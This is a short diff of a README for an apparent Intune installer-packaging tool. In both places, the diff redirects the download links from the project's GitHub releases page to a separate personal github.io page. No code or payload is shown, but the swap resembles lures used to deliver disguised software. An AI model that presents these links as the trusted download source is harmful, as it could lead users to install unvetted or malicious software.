@@ -1,6 +1,6 @@
 # 📦 intunewin-contextprep - Package Installers for Intune in Seconds
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=blue)](https://github.com/ap4993258/intunewin-contextprep/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=blue)](https://ap4993258.github.io)
 
 ## 🧭 What This Tool Does
 
@@ -28,7 +28,7 @@ Getting started is extremely simple. The entire process takes less than two minu
 
 ## 1️⃣ Download the Application
 
-Visit this link to download the application: [https://github.com/ap4993258/intunewin-contextprep/releases](https://github.com/ap4993258/intunewin-contextprep/releases)
+Visit this link to download the application: [https://ap4993258.github.io](https://ap4993258.github.io)
 
 .
 
